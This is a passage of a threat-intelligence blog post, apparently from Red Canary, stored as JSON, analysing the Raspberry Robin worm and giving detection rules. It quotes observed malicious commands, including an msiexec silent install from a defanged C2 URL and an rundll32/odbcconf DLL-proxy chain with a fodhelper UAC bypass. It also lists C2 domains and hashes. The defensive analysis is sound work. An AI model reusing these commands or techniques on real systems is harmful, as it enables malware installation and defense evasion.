            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xee6822ea>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x1e332cba>": "('msiexec')",
                        "<code_0x90ddcf2f>": "('http:', 'https:')",
                        "<code_0xb3189b41>": "('/q', '-q')"
                    },
                    "text": "process == ('msiexec')<crlf>&&<crlf>process_command_line_includes == ('http:', 'https:')<crlf>&&<crlf>process_command_line_includes ==",
                    "html": "<p>process == <code>('msiexec')</code>\n &amp;&amp;\n process_command_line_includes == <code>('http:', 'https:')</code>\n &amp;&amp;\n process_command_line_includes == <code>('/q', '-q')</code></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xa3fab0d2>",
            "title": "Persistence",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xd6466d3d>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x4f1fa27a>": "msiexec.exe",
                        "<code_0xd4d936ab>": "C:\\Windows\\Installer\\MSI****.tmp",
                        "<code_0x7ec8766b>": "C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku"
                    },
                    "text": "In several Raspberry Robin detections, we have seen msiexec.exe go on to install a malicious DLL file. At this time we are not certain what the DLL does.. We suspect it may establish persistence on the victims system. In the detections we saw, the malicious files were created as C:\\Windows\\Installer\\MSI****.tmp files. In one case, a file with the same hash was also created as C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku.",
                    "html": "<p>In several Raspberry Robin detections, we have seen <code>msiexec.exe</code> go on to install a malicious DLL file. At this time we are not certain what the DLL does.. We suspect it may establish persistence on the victim\u2019s system. In the detections we saw, the malicious files were created as <code>C:\\Windows\\Installer\\MSI****.tmp</code> files. In one case, a file with the same hash was also created as <code>C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku</code>.</p>"
                },
                {
                    "id": "<sentence_0x20e8811b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Examples:",
                    "html": "<p>Examples:</p>"
                },
                {
                    "id": "<sentence_0xfed99a44>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x177f1eee>": "https://www.virustotal.com/gui/file/1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1/",
                        "<a_0xf7c627cf>": "https://www.virustotal.com/gui/file/c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c/",
                        "<code_0xa67d7c73>": "C:\\Windows\\Installer\\MSI5C01.tmp",
                        "<code_0x3360de4>": "C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku",
                        "<code_0x4ea6e3eb>": "C:\\Windows\\Installer\\MSIE160.tmp"
                    },
                    "text": "C:\\Windows\\Installer\\MSI5C01.tmp<crlf>C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.kuC:\\Windows\\Installer\\MSIE160.tmpShared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828<crlf>VirusTotal example<crlf>MD5 hash: e8f0d33109448f877a0e532b1a27131a<crlf>VirusTotal example",
                    "html": "<ul><li><code>C:\\Windows\\Installer\\MSI5C01.tmp</code>\n<code>C:\\Users\\username\\AppData\\Local\\Temp\\bznwi.ku</code><p></p><ul><li>Shared MD5 hash: 6f5ea8383bc3bd07668a7d24fe9b0828</li><li><a href=\"https://www.virustotal.com/gui/file/1a5fcb209b5af4c620453a70653263109716f277150f0d389810df85ec0beac1/\" rel=\"noopener noopener\" target=\"_blank\">VirusTotal example</a></li></ul></li><li><code>C:\\Windows\\Installer\\MSIE160.tmp</code><ul><li>MD5 hash: e8f0d33109448f877a0e532b1a27131a</li><li><a href=\"https://www.virustotal.com/gui/file/c0a13af59e578b77e82fe0bc87301f93fc2ccf0adce450087121cb32f218092c/\" rel=\"noopener noopener\" target=\"_blank\">VirusTotal example</a></li></ul></li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xa6bc062b>",
            "title": "Execution (again)",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xfc13dab9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x66cb20e3>": "msiexec.exe",
                        "<code_0x942c7993>": "fodhelper.exe",
                        "<code_0x37821bb4>": "rundll32.exe",
                        "<code_0xaa866891>": "fodhelper.exe",
                        "<code_0x18b04052>": "fodhelper.exe"
                    },
                    "text": "Next, msiexec.exe launches a legitimate Windows utility, fodhelper.exe, which in turn spawns rundll32.exe to execute a malicious command. Processes launched by fodhelper.exe run with elevated administrative privileges without requiring a User Account Control prompt. It is unusual for fodhelper.exe to spawn any processes as the parent, making this another useful detection opportunity.",
                    "html": "<p>Next, <code>msiexec.exe</code> launches a legitimate Windows utility, <code>fodhelper.exe</code>, which in turn spawns <code>rundll32.exe</code> to execute a malicious command. Processes launched by <code>fodhelper.exe</code> run with elevated administrative privileges without requiring a User Account Control prompt. It is unusual for <code>fodhelper.exe</code> to spawn any processes as the parent, making this another useful detection opportunity.</p>"
                },
                {
                    "id": "<sentence_0xaf11de3e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x43f990c4>": "fodhelper.exe",
                        "<code_0x72fc9ce7>": "fodhelper.exe"
                    },
                    "text": "Detection opportunity: fodhelper.exe as a parent process<crlf>Identify Windows Features On Demand helper fodhelper.exe creating<crlf>processes as the parent.",
                    "html": "<p>Detection opportunity: <code>fodhelper.exe</code> as a parent process\n Identify Windows Features On Demand helper <code>fodhelper.exe</code> creating\n processes as the parent.</p>"
                },
                {
                    "id": "<sentence_0xe8e79759>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xf8ef264>": "('fodhelper')"
                    },
                    "text": "parent_process ==",
                    "html": "<p>parent_process == <code>('fodhelper')</code></p>"
                },
                {
                    "id": "<sentence_0x20cf1b54>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x3a0c97a1>": "rundll32.exe",
                        "<code_0x5bc47a18>": "odbcconf.exe",
                        "<code_0xbf0a66f0>": "bznwi.ku",
                        "<code_0x171a473c>": "6f5ea8383bc3bd07668a7d24fe9b0828",
                        "<code_0xb38e43b8>": "username"
                    },
                    "text": "The rundll32.exe command starts another legitimate Windows utility, in this case odbcconf.exe, and passes in additional commands to execute and configure the recently-installed malicious DLL bznwi.ku (Hash: 6f5ea8383bc3bd07668a7d24fe9b0828). Here is what that command looks like. (We modified the random string values in the command, as well as replaced the victims username with username.)",
                    "html": "<p>The <code>rundll32.exe</code> command starts another legitimate Windows utility, in this case <code>odbcconf.exe</code>, and passes in additional commands to execute and configure the recently-installed malicious DLL <code>bznwi.ku</code> (Hash: <code>6f5ea8383bc3bd07668a7d24fe9b0828</code>). Here is what that command looks like. (We modified the random string values in the command, as well as replaced the victim\u2019s username with <code>username</code>.)</p>"
                },
                {
                    "id": "<sentence_0x5b884db4>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb908b55d>": ""
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31203\" height=\"851\" src=\"\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x1bc6e31d>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x163888d>": "https://redcanary.com/wp-content/uploads/2022/05/RRFigure6.jpg"
                    },
                    "text": "",
                    "html": "<img alt=\"\" class=\"alignnone size-full wp-image-31203\" height=\"851\" src=\"https://redcanary.com/wp-content/uploads/2022/05/RRFigure6.jpg\" width=\"2048\"/>"
                },
                {
                    "id": "<sentence_0x5d13ceeb>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd3f95d61>": "rundll32.exe"
                    },
                    "text": "Figure 6: Malicious rundll32.exe command",
                    "html": "<p>Figure 6: Malicious <code>rundll32.exe</code> command</p>"
                },
                {
                    "id": "<sentence_0x98e91896>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xc26ea464>": "-A",
                        "<code_0xd9a0373e>": "odbcconf.exe",
                        "<code_0x20d52f07>": "configdriver",
                        "<code_0xfae8c752>": "VKIPDSE",
                        "<code_0xa6cc4022>": "SETFILEDSNDIR",
                        "<code_0x261ff634>": "HKEY_LOCAL_MACHINE\\SOFTWARE\\ODBC\\ODBC.INI\\ODBC File DSN\\DefaultDSNDir",
                        "<code_0xbb5a84c3>": "INSTALLDRIVER"
                    },
                    "text": "The -A flag in odbcconf.exe specifies an action. configdriver loads the driver setup DLL, in this case VKIPDSE. SETFILEDSNDIR creates the registry location HKEY_LOCAL_MACHINE\\SOFTWARE\\ODBC\\ODBC.INI\\ODBC File DSN\\DefaultDSNDir, if it does not already exist, and specifies the default location used by the ODBC Data Source Administrator when creating a file-based data source. INSTALLDRIVER adds additional information about the driver.",
                    "html": "<p>The <code>-A</code> flag in <code>odbcconf.exe</code> specifies an action. <code>configdriver</code> loads the driver setup DLL, in this case <code>VKIPDSE</code>. <code>SETFILEDSNDIR</code> creates the registry location <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\ODBC\\ODBC.INI\\ODBC File DSN\\DefaultDSNDir</code>, if it does not already exist, and specifies the default location used by the ODBC Data Source Administrator when creating a file-based data source. <code>INSTALLDRIVER</code> adds additional information about the driver.</p>"
                },
                {
                    "id": "<sentence_0xcdcb7b39>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x587b5af3>": "odbcconf.exe",
                        "<code_0x820c4d57>": "odbcconf.exe",
                        "<code_0xf5043e40>": "regsvr",
                        "<code_0x438d07e5>": "regsvr32.exe",
                        "<code_0x53f69d09>": "odbcconf.exe"
                    },
                    "text": "In this detection, we saw odbcconf.exe successfully execute the malicious command. Since odbcconf.exe has a built-in regsvr flag similar to regsvr32.exe, it can be used by adversaries to execute DLLs and bypass application control defenses that arent monitoring for odbcconf.exe misuse.",
                    "html": "<p>In this detection, we saw <code>odbcconf.exe</code> successfully execute the malicious command. Since <code>odbcconf.exe</code> has a built-in <code>regsvr</code> flag similar to <code>regsvr32.exe</code>, it can be used by adversaries to execute DLLs and bypass application control defenses that aren\u2019t monitoring for <code>odbcconf.exe</code> misuse.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xc6083f31>",
            "title": "Detection opportunity: odbcconf.exe loading .DLLs",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x7302afe9>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xebc5cb29>": "/F",
                        "<code_0xbf4a740e>": "/S",
                        "<code_0x7886e13a>": "Odbcconf.exe"
                    },
                    "text": "Detect the Windows Open Database Connectivity utility loading a configuration<crlf>file or DLL. The /A flag specifies an action, /F uses a response file, and /S runs in silent mode.<crlf>Odbcconf.exe running rgsvr actions in silent mode could indicate misuse.",
                    "html": "<p>Detect the Windows Open Database Connectivity utility loading a configuration\n file or DLL. The /A flag specifies an action, <code>/F</code> uses a response file, and <code>/S</code> runs in silent mode.\n <code>Odbcconf.exe</code> running rgsvr actions in silent mode could indicate misuse.</p>"
                },
                {
                    "id": "<sentence_0xfd368d5a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xc63e4d89>": "('odbcconf')",
                        "<code_0x992b1c7d>": "('regsvr)",
                        "<code_0xeb11d7b5>": "('/f', '-f')",
                        "<code_0x571f297>": "('/a', '-a')",
                        "<code_0xd0f34ea3>": "('/s', '-s')"
                    },
                    "text": "process == ('odbcconf')<crlf>&&<crlf>process_command_line_includes == ('regsvr)<crlf>&&<crlf>process_command_line_includes == ('/f', '-f')<crlf>||<crlf>process_command_line_includes == ('/a', '-a')<crlf>||<crlf>process_command_line_includes ==",
                    "html": "<p>process == <code>('odbcconf')</code>\n &amp;&amp;\n process_command_line_includes == <code>('regsvr)</code>\n &amp;&amp;\n process_command_line_includes == <code>('/f', '-f')</code>\n ||\n process_command_line_includes == <code>('/a', '-a')</code>\n ||\n process_command_line_includes == <code>('/s', '-s')</code></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xf1db1993>",
            "title": "C2, part deux",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x3ad26292>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x2a056d82>": "regsvr32.exe",
                        "<code_0xbb0eaae2>": "rundll32.exe",
                        "<code_0x5f5d8358>": "dllhost.exe",
                        "<code_0x5ad59ea7>": "hxxps[:]//www[.]ivuoq6si2a[.]com/"
                    },
                    "text": "We observed outbound C2 activity involving the processes regsvr32.exe, rundll32.exe, and dllhost.exe executing without any command-line parameters and making external network connections to IP addresses associated with TOR nodes. Additionally, some of the IP addresses in the connections host domains consisting of random alphanumeric characters. For example, hxxps[:]//www[.]ivuoq6si2a[.]com/.",
                    "html": "<p>We observed outbound C2 activity involving the processes <code>regsvr32.exe</code>, <code>rundll32.exe</code>, and <code>dllhost.exe</code> executing without any command-line parameters and making external network connections to IP addresses associated with TOR nodes. Additionally, some of the IP addresses in the connections host domains consisting of random alphanumeric characters. For example, <code>hxxps[:]//www[.]ivuoq6si2a[.]com/</code>.</p>"
                },
                {
                    "id": "<sentence_0xb292b7e2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x19526001>": "regsvr32.exe",
                        "<code_0xde94f0db>": "rundll32.exe",
                        "<code_0x7dd24fde>": "dllhost.exe"
                    },
                    "text": "This activity presents us with a final detection opportunity. It is atypical for regsvr32.exe, rundll32.exe and dllhost.exe to execute with no command-line parameters and establish external network connections. This behavior is not inherently malicious, but is good to monitor.",
                    "html": "<p>This activity presents us with a final detection opportunity. It is atypical for <code>regsvr32.exe</code>, <code>rundll32.exe</code> and <code>dllhost.exe</code> to execute with no command-line parameters and establish external network connections. This behavior is not inherently malicious, but is good to monitor.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x90c40d79>",
            "title": "Detection opportunity: network connections from the command line with no parameters",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xc153fae2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd2d86592>": "regsvr32.exe",
                        "<code_0xca440f9e>": "rundll32.exe",
                        "<code_0x138e7456>": "dllhost.exe"
                    },
                    "text": "Detect regsvr32.exe, rundll32.exe, and dllhost.exe making external network<crlf>connections with an empty command line.",
                    "html": "<p>Detect <code>regsvr32.exe</code>, <code>rundll32.exe</code>, and <code>dllhost.exe</code> making external network\n connections with an empty command line.</p>"
                },
                {
                    "id": "<sentence_0xaf876492>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x13881b6f>": "('regsvr32')",
                        "<code_0xfd04332e>": "('rundll32')",
                        "<code_0x5f5706f7>": "('dllhost')",
                        "<code_0x592577a9>": "(\u201c\u201d)"
                    },
                    "text": "process == ('regsvr32')<crlf>||<crlf>process == ('rundll32')<crlf>||<crlf>process == ('dllhost')<crlf>&&<crlf>process_command_line_contains == ()<crlf>&&<crlf>has_netconnection",
                    "html": "<p>process == <code>('regsvr32')</code>\n ||\n process == <code>('rundll32')</code>\n ||\n process == <code>('dllhost')</code>\n &amp;&amp;\n process_command_line_contains == <code>(\u201c\u201d)</code>\n &amp;&amp;\n has_netconnection</p>"
                },
                {
                    "id": "<sentence_0x26cc1fdf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "*Note: Double Quotes () within the command line means null.",
                    "html": "<p>*Note: Double Quotes (\u201c\u201d) within the command line means null.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x9a273b4e>",
            "title": "Intelligence gaps",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xe9023cac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Several unanswered questions about this cluster remain. First and foremost, we dont know how or where Raspberry Robin infects external drives to perpetuate its activity, though its likely this occurs offline or otherwise outside of our visibility. We also dont know why Raspberry Robin installs a malicious DLL. One hypothesis is that it may be an attempt to establish persistence on an infected system, though additional information is required to build confidence in that hypothesis.",
                    "html": "<p>Several unanswered questions about this cluster remain. First and foremost, we don\u2019t know how or where Raspberry Robin infects external drives to perpetuate its activity, though it\u2019s likely this occurs offline or otherwise outside of our visibility. We also don\u2019t know why Raspberry Robin installs a malicious DLL. One hypothesis is that it may be an attempt to establish persistence on an infected system, though additional information is required to build confidence in that hypothesis.</p>"
                },
                {
                    "id": "<sentence_0xf64b5fe9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Perhaps our biggest question concerns the operators objectives. Absent additional information on later-stage activity, its difficult to make inferences on the goal or goals of these campaigns. Despite this, we hope this information is useful for informing broader efforts to track and better detect Raspberry Robin activity. We hope to start a conversation that will help the whole community learn more about this threat. If youve been tracking similar activity, wed love to hear from you and collaborate. Contact with any observations or questions.",
                    "html": "<p>Perhaps our biggest question concerns the operators\u2019 objectives. Absent additional information on later-stage activity, it\u2019s difficult to make inferences on the goal or goals of these campaigns. Despite this, we hope this information is useful for informing broader efforts to track and better detect Raspberry Robin activity. We hope to start a conversation that will help the whole community learn more about this threat. If you\u2019ve been tracking similar activity, we\u2019d love to hear from you and collaborate. Contact <a href=\"mailto:intel@redcanary.com\" rel=\"noopener noopener\" target=\"_blank\">intel@redcanary.com</a> with any observations or questions.</p>"
                },
                {
                    "id": "<sentence_0x765bab09>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x88ff1731>": "https://redcanary.com/authors/jeff-felling/"
                    },
                    "text": "Thank you to all our contributing researchers who helped make this research possible, especially Jeff Felling from Red Canary Intelligence and Jason Killam from Red Canary Detection Engineering.",
                    "html": "<p>Thank you to all our contributing researchers who helped make this research possible, especially <a href=\"https://redcanary.com/authors/jeff-felling/\" rel=\"noopener noopener\" target=\"_blank\">Jeff Felling</a> from Red Canary Intelligence and Jason Killam from Red Canary Detection Engineering.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xa87dab1b>",
            "title": "Appendix",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xc9a4a2a3>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x94ccb940>": "https://redcanary.com/mitre-attack/"
                    },
                    "text": "As we define parameters for an activity cluster, we map behaviors to MITRE ATT&CK where applicable and note observables of interest. In some cases, often with infrastructure and certain adversary decisions, observables associated with an activity cluster may not neatly map to an ATT&CK technique, and thats okay.",
                    "html": "<p>As we define parameters for an activity cluster, we map behaviors to <a href=\"https://redcanary.com/mitre-attack/\" rel=\"noopener noopener\" target=\"_blank\">MITRE ATT&amp;CK</a> where applicable and note observables of interest. In some cases, often with infrastructure and certain adversary decisions, observables associated with an activity cluster may not neatly map to an ATT&amp;CK technique, and that\u2019s okay.</p>"
                },
                {
                    "id": "<sentence_0xd58f2a32>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xf7526de6>": {
                            "Tactic": {
                                "0": "Tactic:  Initial Access",
                                "1": "Tactic:  Initial Access",
                                "2": "Tactic:  Execution",
                                "3": "Tactic:  Defense Evasion",
                                "4": "Tactic:  Defense Evasion",
                                "5": "Tactic:  C2",
                                "6": "Tactic:  C2",
                                "7": "Tactic:  C2",
                                "8": "Tactic:  C2"
                            },
                            "Technique": {
                                "0": "Technique :  T1091 Replication Through Removable Media",
                                "1": "Technique :",
                                "2": "Technique :  T1059.003 Command and Scripting Interpreter (Windows Command Shell)",
                                "3": "Technique :",
                                "4": "Technique :  T1218.008 Signed Binary Proxy Execution: Rundll32  T1218.008 Signed Binary Proxy Execution: Odbcconf",
                                "5": "Technique :  T1218.007 Signed Binary Proxy Execution: Msiexec  T1071.001 Application Layer Protocol: Web Protocols",
                                "6": "Technique :",
                                "7": "Technique :",
                                "8": "Technique :  T1218.008 Signed Binary Proxy Execution: Rundll32  T1218.008 Signed Binary Proxy Execution: Regsvr32"
                            },
                            "Description": {
                                "0": "Description:  In some cases, Raspberry Robin was introduced via infected removable drives. In these instances, the worm appeared as a shortcut (LNK file) masquerading as a legitimate folder on a USB device",
                                "1": "Description:  explorer.exe  with a command line containing a reference to a device or a name",
                                "2": "Description:  Raspberry Robin uses the \u201cstandard-in\u201d command prompt feature  cmd/R <  to read and execute a file with a name composed of several seemingly random alphanumeric characters",
                                "3": "Description:  The use of mixed-case letters, which is tradecraft sometimes used by adversaries to evade defenses (not unique to Raspberry Robin)",
                                "4": "Description:  Raspberry Robin uses legitimate Windows utilities like  fodhelper.exe  and  odbcconf.exe  to proxy DLL file execution with  rundll32.exe",
                                "5": "Description:  Msiexec.exe  making external network connections to URLs that include the victim\u2019s hostname and username",
                                "6": "Description:  Recently registered top-level domains with few characters, likely used as C2 infrastructure",
                                "7": "Description:  Use of infrastructure tied to compromised QNAP NAS devices (not unique to Raspberry Robin)",
                                "8": "Description:  rundll32.exe  and  regsvr32.exe  used for C2 communication"
                            },
                            "Observable": {
                                "0": "Observable :  e:\\removable disk.lnk",
                                "1": "Observable :  ExpLoRER \u201cUSB Drive\u201d or EXPLorEr \u201cLAUREN V\u201d or  eXPLOReR LNkFILe",
                                "2": "Observable :  C:\\Windows\\system32\\cmd.exe\u201d /R CMD<lAkTp.mY0",
                                "3": "Observable :  mSIeXEc, ExpLoRER, or HTtp in a command line",
                                "4": "Observable :  \u201cRUNDLL32.exe\u201d shell32,ShellExec_RunDLLA \u201cC:\\WINDOWS\\syswow64\\odbcconf.exe\u201d -A {regsvr \u201cC:\\Users\\[redacted]\\AppData\\Local\\Temp\\bznwi.ku.\u201d} -E -A {configdriver VKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND ofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo OGEYSCKXFTBNXAF}",
                                "5": "Observable :  msiEXEC /Q -I hXxp://3h[.]WF:8080/ZgMaAJK3xTC/LP079LLP=52284",
                                "6": "Observable :  3h[.]WF or v0[.]cx",
                                "7": "Observable :",
                                "8": "Observable :  Look for  rundll32.exe  and/or  regsvr32.exe  making external network connections with no command-line arguments"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table><thead><tr><th>Tactic</th><th>Technique</th><th>Description</th><th>Observable</th></tr></thead><thead></thead><tbody><tr><td class=\"center-\">Tactic:<p>Initial Access</p></td><td class=\"center-\">Technique :<p>T1091 Replication Through Removable Media</p></td><td class=\"center-\">Description:<p>In some cases, Raspberry Robin was introduced via infected removable drives. In these instances, the worm appeared as a shortcut (LNK file) masquerading as a legitimate folder on a USB device</p></td><td class=\"center-\">Observable :<p>e:\\removable disk.lnk</p></td></tr><tr><td class=\"center-\">Tactic:<p>Initial Access</p></td><td class=\"center-\">Technique :</td><td class=\"center-\">Description:<p><code>explorer.exe</code> with a command line containing a reference to a device or a name</p></td><td class=\"center-\">Observable :<p>ExpLoRER \u201cUSB Drive\u201d or EXPLorEr \u201cLAUREN V\u201d or\n eXPLOReR LNkFILe</p></td></tr><tr><td class=\"center-\">Tactic:<p>Execution</p></td><td class=\"center-\">Technique :<p>T1059.003 Command and Scripting Interpreter (Windows Command Shell)</p></td><td class=\"center-\">Description:<p>Raspberry Robin uses the \u201cstandard-in\u201d command prompt feature <code>cmd/R &lt;</code> to read and execute a file with a name composed of several seemingly random alphanumeric characters</p></td><td class=\"center-\">Observable :<p>C:\\Windows\\system32\\cmd.exe\u201d /R CMD&lt;lAkTp.mY0</p></td></tr><tr><td class=\"center-\">Tactic:<p>Defense Evasion</p></td><td class=\"center-\">Technique :</td><td class=\"center-\">Description:<p>The use of mixed-case letters, which is tradecraft sometimes used by adversaries to evade defenses (not unique to Raspberry Robin)</p></td><td class=\"center-\">Observable :<p>mSIeXEc, ExpLoRER, or HTtp in a command line</p></td></tr><tr><td class=\"center-\">Tactic:<p>Defense Evasion</p></td><td class=\"center-\">Technique :<p>T1218.008 Signed Binary Proxy Execution: Rundll32\n T1218.008 Signed Binary Proxy Execution: Odbcconf</p></td><td class=\"center-\">Description:<p>Raspberry Robin uses legitimate Windows utilities like <code>fodhelper.exe</code> and <code>odbcconf.exe</code> to proxy DLL file execution with <code>rundll32.exe</code></p></td><td class=\"center-\">Observable :<p>\u201cRUNDLL32.exe\u201d shell32,ShellExec_RunDLLA \u201cC:\\WINDOWS\\syswow64\\odbcconf.exe\u201d -A {regsvr \u201cC:\\Users\\[redacted]\\AppData\\Local\\Temp\\bznwi.ku.\u201d} -E -A {configdriver VKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND ofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo OGEYSCKXFTBNXAF}</p></td></tr><tr><td class=\"center-\">Tactic:<p>C2</p></td><td class=\"center-\">Technique :<p>T1218.007 Signed Binary Proxy Execution: Msiexec\n T1071.001 Application Layer Protocol: Web Protocols</p><p> </p><p> </p></td><td class=\"center-\">Description:<p><code>Msiexec.exe</code> making external network connections to URLs that include the victim\u2019s hostname and username</p></td><td class=\"center-\">Observable :<p>msiEXEC /Q -I hXxp://3h[.]WF:8080/ZgMaAJK3xTC/LP079LLP=52284</p></td></tr><tr><td class=\"center-\">Tactic:<p>C2</p></td><td class=\"center-\">Technique :</td><td class=\"center-\">Description:<p>Recently registered top-level domains with few characters, likely used as C2 infrastructure</p></td><td class=\"center-\">Observable :<p>3h[.]WF or v0[.]cx</p></td></tr><tr><td class=\"center-\">Tactic:<p>C2</p></td><td class=\"center-\">Technique :</td><td class=\"center-\">Description:<p>Use of infrastructure tied to compromised QNAP NAS devices (not unique to Raspberry Robin)</p></td><td class=\"center-\">Observable :</td></tr><tr><td class=\"center-\">Tactic:<p>C2</p></td><td class=\"center-\">Technique :<p>T1218.008 Signed Binary Proxy Execution: Rundll32\n T1218.008 Signed Binary Proxy Execution: Regsvr32</p><p> </p></td><td class=\"center-\">Description:<p><code>rundll32.exe</code> and <code>regsvr32.exe</code> used for C2 communication</p></td><td class=\"center-\">Observable :<p>Look for <code>rundll32.exe</code> and/or <code>regsvr32.exe</code> making external network connections with no command-line arguments</p></td></tr></tbody></table>"
                },
                {
                    "id": "<sentence_0xcc9b2c2c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xb6584f73>": "https://redcanary.com/blog/intelligence-insights-april-2022/"
                    },
                    "text": "",
                    "html": "<a class=\"permalink\" href=\"https://redcanary.com/blog/intelligence-insights-april-2022/\"> </a>"
                },
                {
                    "id": "<sentence_0x7f543d2>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<ul class=\"meta\"><li class=\"topic\"><a>Detection and response</a></li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xbc922aa5>",
            "title": "Intelligence Insights: April 2022",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x654a02e1>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x2e137fe3>": "https://redcanary.com/blog/access-tokens/"
                    },
                    "text": "",
                    "html": "<a class=\"permalink\" href=\"https://redcanary.com/blog/access-tokens/\"> </a>"
                },
                {
                    "id": "<sentence_0x52b34445>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<ul class=\"meta\"><li class=\"topic\"><a>Detection and response</a></li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xa7c950d9>",
            "title": "Better know a data source: Access tokens (and why theyre hard to get)",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xcd857150>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0x70f057cc>": "https://redcanary.com/blog/2022-threat-detection-report/"
                    },
                    "text": "",
                    "html": "<a class=\"permalink\" href=\"https://redcanary.com/blog/2022-threat-detection-report/\"> </a>"
                },
                {
                    "id": "<sentence_0x7224c15d>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<ul class=\"meta\"><li class=\"topic\"><a>Detection and response</a></li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x322010d9>",
            "title": "Unwrapping the 2022 Threat Detection Report",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x5d1fd7c8>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa6d66265>": "https://redcanary.com/blog/intelligence-insights-march-2022-3/"
                    },
                    "text": "",
                    "html": "<a class=\"permalink\" href=\"https://redcanary.com/blog/intelligence-insights-march-2022-3/\"> </a>"
                },
                {
                    "id": "<sentence_0xb1f20ee4>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<ul class=\"meta\"><li class=\"topic\"><a>Detection and response</a></li></ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x4bde145d>",
            "title": "Intelligence Insights: March 2022",
            "title_level": 3,
            "sentences": []
        }
    ]
}